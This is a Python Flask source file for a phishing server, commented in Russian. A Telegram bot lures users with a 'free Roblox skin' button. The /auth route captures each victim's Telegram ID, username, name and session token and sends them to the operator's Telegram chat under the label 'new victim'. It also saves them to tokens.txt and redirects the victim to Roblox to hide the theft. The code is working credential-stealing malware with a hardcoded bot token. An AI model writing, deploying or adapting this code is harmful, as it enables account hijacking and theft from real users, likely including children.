from flask import Flask, request, redirect, jsonify
import requests
import json
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "7854566294:AAGyNSrEwNeZ9SNEFR2HZKNaYkv3ZhIoTXk"
CHAT_ID = "5388340518"

@app.route('/')
def index():
    return open('index.html').read()

@app.route('/auth', methods=['GET', 'POST'])
def auth():
    # Получаем все данные от виджета
    token = request.args.get('token')
    id = request.args.get('id')
    username = request.args.get('username')
    first_name = request.args.get('first_name')
    auth_date = request.args.get('auth_date')
    photo_url = request.args.get('photo_url')
    
    # Формируем сообщение
    msg = f"🔥 **НОВАЯ ЖЕРТВА** 🔥\n\n"
    msg += f"🆔 ID: {id}\n"
    if username:
        msg += f"📛 Username: @{username}\n"
    if first_name:
        msg += f"📝 Имя: {first_name}\n"
    if token:
        msg += f"\n🔑 **ТОКЕН СЕССИИ:**\n`{token[:100]}`\n"
    msg += f"\n⏱ Время: {datetime.now().strftime('%H:%M:%S')}"
    
    # Отправляем в Telegram
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    requests.post(url, json={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
    
    # Сохраняем токен в файл
    if token:
        with open('tokens.txt', 'a') as f:
            f.write(f"{datetime.now()}|{id}|{username}|{token}\n")
    
    # Редиректим на Roblox (жертва не палится)
    return redirect('https://www.roblox.com/games/')

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if 'message' in data and data['message'].get('text') == '/start':
        chat_id = data['message']['chat']['id']
        keyboard = {
            "inline_keyboard": [[{
                "text": "🎁 Забрать скин",
                "url": "https://tg-session-grabber.onrender.com"
            }]]
        }
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        payload = {
            'chat_id': chat_id,
            'text': "🔥 Нажми на кнопку, чтобы получить бесплатный скин Roblox!",
            'reply_markup': json.dumps(keyboard)
        }
        requests.post(url, json=payload)
    return jsonify({'ok': True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
